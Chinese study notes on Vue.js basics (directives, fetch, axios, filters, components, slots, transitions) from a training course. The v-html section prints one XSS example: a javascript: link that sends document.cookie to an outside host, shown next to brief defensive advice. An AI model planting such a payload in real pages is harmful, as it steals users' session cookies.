# 千锋Vue学习笔记

[TOC]

## 写在前面

- 封面 | 摘要 | 关键词

  ![首页](https://img-blog.csdnimg.cn/c944cb785bb946898ed1a018ad717104.jpeg)

  千锋Vue学习笔记

  ```
  Vue
  李英俊
  前端
  千锋
  ```

- 学习链接

- 感想 | 摘抄

  - vue的架构模式是mvvm（双向绑定）（不是mvc）

  - 需要计算属性的逻辑，写在 `computed` 中，因为多次使用的话，函数会调用多次，而计算属性只会运行一次。

  - ajax、fetch、xhr是什么关系
    - ajax是异步或局部更新页面的技术
    - xhr是实现ajax的方法，xhr过时了，改成fetch
    - [fetch兼容性不好](https://caniuse.com/?search=fetch)，如果不支持可以用fetch-ie8，实际就是检测浏览器不支持fetch的话，就改为xhr
    
  - diff算法在判断的时候，如果标签tag不一样，会当机立断直接换掉虚拟dom；如果没有key，且标签一样，则diff算法只会看值是否改变，所以动画就不会更新；如果给同样的div加上不同的key值，则可以让虚拟dom

    - 把树按照层级分解对比

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/b281090eaede46d7acff0910504907f4.png)

    - 同key值对比

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/ca008aa2eeac4bd1b910d6a583c48564.png)

    - 同组件对比

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/43ade5ca82994729984def73645eda45.png)

- 学习时遇到的问题

- 直通车

- <span style="color: skyblue; font-weight: bold">PS：相关工程代码都在 Github 上</span>

## 1. 前言

1. Vue是通过拦截变量的get和set方法，来进行监听和更新的
2. `Object.defineProperty`有以下缺点：
   1. 无法监听es6的Set、Map变化
   2. 无法监听Class类型的数据
   3. 属性的新加或者删除也无法监听
   4. 数组元素的增加和删除也无法监听
3. `:src`、`:class`这样的写法的完整写法是：`v-bind:src`
4. 同理，事件 `@click`绑定的完整写法是：`v-on:click`

## 2. 模板语法

1. 插值

   1. 文本：`{{}}`

   2. 纯HTML

      ```
      v-html，放置XSS, CSRF(
      	(1) 前端过滤
      	(2) 后台转义(<> &lt; &gt;)
      	(3) 给cookie加上属性http
      )
      
      <a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>click</a>
      ```

   3. 表达式

2. 指令：是带有 `v-` 前缀的特殊属性

   - `v-bind`：动态绑定属性
   - `v-if`：动态创建/删除
     - `v-else`
     - `v-else-if`
     - `template v-if`：包装元素template不会被创建
   - `v-show`：动态显示/隐藏
   - `v-on:click`：绑定事件
   - `v-for`：遍历
   - `v-model`：双向绑定表单

3. 缩写

   1. `v-bind:src`：`:src`
   2. `v-on:click`：`@click`

4. 关于vue数据对象新增拦截属性的解决方案

   - vue2：
     - `Vue.set(vm.classobj, "dd", true)`
     - `Vue.set(vm.styleobj, "fontSize", "30px")`
   - vue3: 支持动态增加属性的拦截
   - **动态切换这里可以用对象，也可以用数组，用数组的时候vue两个版本都正常**
   - 注意：如果是直接操作 `:style` 的形式，需要按照js的语法去设置css，即需要用驼峰命名法

5. template是一个包装元素，可以控制子元素的同生共死，同时不会影响dom结构

6. 列表渲染

   1. `v-for`（特殊 v-for=“n in 10”）

      1. in
      2. of

      没有区别

   2. key

      1. 跟踪每个节点的身份，从而重用和重新排序现有元素
      2. 理想的key值是每项都有的且唯一的id，data.id

   3. 数组更新检测

      1. 使用以下方法操作数组，可以检测变动
         - `push`
         - `pop`
         - `shift`
         - `unshift`
         - `splice`
         - `soft`
         - `reverse`

      2. 新数组替换旧数组
         - `filter`
         - `concat`
         - `slice`
         - `map`

      3. 不能检测以下变动的数组

         ```
         vm.items[indexOfItem] = newValue
         ```

         *解决*：

         - `Vue.set(example1.items, indexOfItem, newValue)`
         - splice

      4. 应用：显示过滤结果

   4. 事件处理

      1. 监听事件-直接触发代码
      2. 方法事件处理器-写函数名 handleClick
      3. **内联处理器方法-执行函数表达式**  `handleClick($event)`，`$event` 事件对象
         - 推荐
         - 需要加对事件的引用的话，就直接$加上就行，全包~
      4. 事件修饰符
         - .stop：阻止事件向上冒泡
         - .prevent
         - .capture
         - .self：只有点击自己的时候才会触发
         - .once：只能触发一次，触发完之后解除事件绑定了
         - .enter：`@keyup.enter`，回车触发事件；组合键：`@keyup.ctrl.enter`，按键修饰符：
           - .esc
           - .up
           - .down
           - .left
           - .right
           - .space
           - .ctrl
           - .shift
           - .delete
           - **注意，除了这些常用的按键之外，可以直接用类似 `@keyup.65` 键值的属性来模拟对应的按键**

   5. vue 操作dom底层，虚拟dom

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/2785ead09eab41e688201be7a350a6ae.png)

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/3ab4b9b9db954230a111a3118a7ea8f8.png)

   6. change和input的区别

      - change只有在输入框失去焦点，且内容发生改变时，才会触发函数

   7. 函数加括号和不加括号的区别

      - 需要传参的时候加括号

      - 如果不加括号：可以**获取事件对象**

        函数增加形参 `evt`，那么 `evt.target` 就是源dom，`evt.target.value` 就是input dom里的值

      - 如果两种参数都需要传递的话，采用该方案：`handleAdd1($event, param_1, param_2, param_3)`

        - 这里的 `$event` 是写死的，不能换其他的变量名

      - 直接写表达式同样可以完成该请求：`count++`

7. 一些知识

   - data：状态，被拦截
   - 方法，methods：事件绑定，逻辑计算。可以不用return，没有缓存
   - 计算属性（重视结果），computed：解决模板过重的问题，必须有return，只求结果，有缓存，同步。
   - watch（重视过程）：监听一个值的改变，不用返回值，异步同步。

8. fetch

   - get：

     ```js
     handleFetch() {
         fetch("./json/test.json").then(res => {
             // 状态码，响应头，拿不到真正的数据
             return res.json()
         }).then(res => {
             console.log(res);
         }).catch(err => {
             console.log(err);
         })
     }
     ```

   - post：

     ```js
     // post-1
     handleFetchPost1() {
         fetch("**", {
             method: 'post',
             headers: {
                 "Content-Type": "application/x-www-form-urlencoded"
             },
             body: "name=kerwin&age=100",
         }).then(res => res.json()).then(res => { console.log(res); })
     },
     // post-2
     handlejFetchPost2() {
         fetch("**", {
             method: 'post',
             headers: {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
                 name: 'kervin',
                 age: 100
             })
         }).then(res => res.json()).then(res => { console.log(res); })
     }
     ```

   - 注意：fetch请求默认是不带cookie的，需要设置 `fetch(url, {credentials: 'include'})`

9. axios：非官方的好用的库

   ```js
   handleClick(){
       axios.get("./json/movie.json").then(res=>{
           console.log(res.data.data.films);
           this.dataList = res.data.data.films
       })
   }
   ```

10. 过滤器（管道符）：`|`

  - 把原始数据通过管道送给过滤器进行加工

    ```html
    <img :src="item.img | imgFilter" />
    ```

  - 过滤器的定义

    ```vue
    Vue.filter("imgFilter", (url) => {
    	return url.replace('w.h/', '')+'@1l_1e_1c_128w_180h'
    })
    ```

  - 多个过滤器串行处理：`<img :src="item.img | imgFilter1 | imgFilter2" />`

  - vue3不支持

11. 组件定义

    - `<swiper></swiper>`

    - Why?：扩展html元素，封装可重用的代码

    - 方案

      - 全局创建组件
      - 局部创建组件

    - 注意：

      1. 起名字：组件名如果用了驼峰写法，在html中需要把大写换成小写，再用-隔开

         ```
         <div id="box">
             <yingjun-navbar></yingjun-navbar>
         </div>
         
         Vue.component("yingjunNavbar"...
         ```

      2. dom 片段没有代码提示，没有高亮显示：**vue单文件组件可以解决**

      3. css 只能写成行内：**vue单文件组件可以解决**

      4. template 包含一个根节点：**不能有兄弟节点**

      5. 组件是孤岛，无法直接访问外面组件的状态或者方法：**间接的组件通信来交流**

      6. 所有的组件都在一起，太乱了：**vue单文件组件可以解决**

12. 全局和局部

    - 父传子：`props: ["变量名"]`

    - 属性验证：改list为dict

      ```
      props: {
          myname: String,
          myright: Boolean
      }
      ```

    - 加上默认值

      ```
      props: {
          myname: {
              type: String,
              default: ""
          },
          myright: {
              type: Boolean,
              default: true
          }
      },
      ```

    - 父传子的理解：data中定义的a，可以传给模板component的**属性**，然后该属性在component的props中定义，这就实现了父类变量->子类变量的映射，从而实现传值，最后在template中使用该值。注意：上述**属性**前记得加 `:`

    - 如果父传子靠**属性**，那么子传父靠的是**事件**

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/e318f3bbf463403a8b22dbe570a43acc.png)

    - bus：中央事件总线，订阅发布模式

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/a893d0f571d04e969c1da9a5c68b798e.png)

    - vuex：状态管理

    - 组件refs

      - ref 绑定dom节点，拿到的就是dom对象
      - ref 绑定组件，拿到的就是 组件对象
      
    - **属性**：父组件传给你的属性，只有父组件可以重新传，但不允许子组件随意修改

    - **状态**：组件内部的状态，可以随意修改

    - `v-once`：你可能有一个组件，这个组件包含了大量的静态内容，在这种情况下，你可以在根元素上添加 `v-once` attribute以确保这些内容只计算一次然后缓存起来

13. 动态组件

    - 如果没有动态组件，那么在实现页面的时候，需要把所有的组件都写上，用一个变量来控制 v-show

      ```
      <home v-show="which==='home'"></home>
      <list v-show="which==='list'"></list>
      <shopcar v-show="which==='shopcar'"></shopcar>
      ```

    - 有动态组件的时候，一行就可以解决

      ```
      <component :is="which"></component>
      ```

14. slot 插槽|内容分发

   扩展组件能力，让组件的封装性、复用性更好

   父组件模板的内容在父组件作用域内编译，子组件模板的内容在子组件作用域内编译

   - 获取组件里面的内容放入模板的 slot中

     ```html
     <body>
         <div id="box">
             <child>
                 <div>1111111</div>
                 <div>222222222</div>
             </child>
         </div>
         <script>
             Vue.component("child", {
                 template: `
                     <div>
                         child
                         <slot></slot>
                         <slot></slot>
                     </div>
                 `
             })
             new Vue({
                 el: "#box"
             })
         </script>
     </body>
     ```

   - 具名插槽：`<slot name="a"></slot>`

     ```html
     <body>
         <div id="box">
             <child>
                 <div slot="a">1111111</div>
                 <div slot="b">222222222</div>
                 <div slot="c">33333</div>
                 <div>44444</div>
             </child>
         </div>
         <script>
             Vue.component("child", {
                 template: `
                     <div>
                         child
                         <slot name="a"></slot>
                         <slot name="b"></slot>
                         <slot name="b"></slot>
                         <slot name="c"></slot>
                         <slot></slot>
                     </div>
                 `
             })
             new Vue({
                 el: "#box"
             })
         </script>
     </body>
     ```

   - 新版slot写法 template

     ```vue
     <body>
         <div id="box">
             <navbar>
                 <!-- <button slot="left">aaa</button> -->
                 <template #left>
                     <div>
                         <button>aaa</button>
                     </div>
                 </template>
                 <!-- <i class="iconfont icon-all" slot="right">字体图标</i> -->
                 <template #right>
                     <div>
                         <i class="iconfont icon-all">字体图标</i>
                     </div>
                 </template>
             </navbar>
             <child>
                 <template v-slot:a>
                     <div>
                         1a1a1a
                     </div>
                 </template>
                 <template #b>
                     <div>
                         2b2b2b2
                     </div>
                 </template>
                 <!-- <div slot="a">1111111</div> -->
                 <div slot="b">222222222</div>
                 <div slot="c">33333</div>
                 <div>44444</div>
             </child>
     
         </div>
         <script>
             Vue.component("navbar", {
                 template: `
                     <div>
                         <slot name="left"></slot>
                         <span>navbar</span>
                         <slot name="right"></slot>
                     </div>
                 
                 `
             })
             Vue.component("child", {
                 template: `
                     <div>
                         child
                         <slot name="a"></slot>
                         <slot name="b"></slot>
                         <slot name="b"></slot>
                         <slot name="c"></slot>
                         <slot></slot>
                     </div>
                 `
             })
             new Vue({
                 el: "#box"
             })
         </script>
     </body>
     ```

15. 动画过渡

   ```vue
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta http-equiv="X-UA-Compatible" content="IE=edge">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Document</title>
       <script type="text/javascript" src="lib/vue.js"></script>
       <style>
           /* 进场动画 */
           .yingjun-enter-active {
               animation: aaa 0.5s;
           }
   
           /* 出场动画 */
           .yingjun-leave-active {
               animation: aaa 0.5s reverse;
           }
           @keyframes aaa {
               0% {
                   opacity: 0;
                   transform: translateX(100px);
               }
               100% {
                   opacity: 1;
                   transform: translateX(0px);
               }
           }
       </style>
   </head>
   <body>
       <div id="box">
           <button @click="isShow = !isShow">change</button>
           <!-- 动画入场和离场 -->
           <transition enter-active-class="yingjun-enter-active" leave-active-class="yingjun-leave-active">
               <div v-show="isShow">11111111111</div>
           </transition>
           <!-- 简写 -->
           <transition name="yingjun">
               <div v-show="isShow">11111111111</div>
           </transition>
           <script>
               new Vue({
                   el: "#box",
                   data: {
                       isShow: false
                   }
               })
           </script>
       </div>
   </body>
   </html>
   ```

   - 初始添加动画：`<transition name="yingjun" appear>`
   - 




























------


- :cloud: 我的CSDN：`https://blog.csdn.net/qq_21579045/`
- :snowflake: 我的博客园：`https://www.cnblogs.com/lyjun/`
- :sunny: 我的Github：`https://github.com/TinyHandsome/`
- :rainbow: 我的bilibili：`https://space.bilibili.com/8182822/`
- :avocado: 我的思否：`https://segmentfault.com/u/liyj/`
- :tomato: 我的知乎：`https://www.zhihu.com/people/lyjun_/`
- :potato: 我的豆瓣：`https://www.douban.com/people/lyjun_/`
- :penguin: 粉丝交流群：1060163543，神秘暗号：为干饭而来

碌碌谋生，谋其所爱。:ocean:              @李英俊小朋友
